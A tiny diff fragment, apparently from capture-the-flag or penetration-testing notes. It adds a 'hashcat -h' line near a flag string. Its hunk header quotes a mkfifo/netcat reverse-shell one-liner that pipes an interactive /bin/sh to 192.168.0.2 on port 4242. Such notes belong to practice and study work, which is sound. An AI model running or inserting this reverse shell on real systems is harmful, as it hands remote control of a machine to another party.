@@ -124,6 +124,7 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/
 
 flag{f9038f}:
 
+hashcat -h
 
 
 
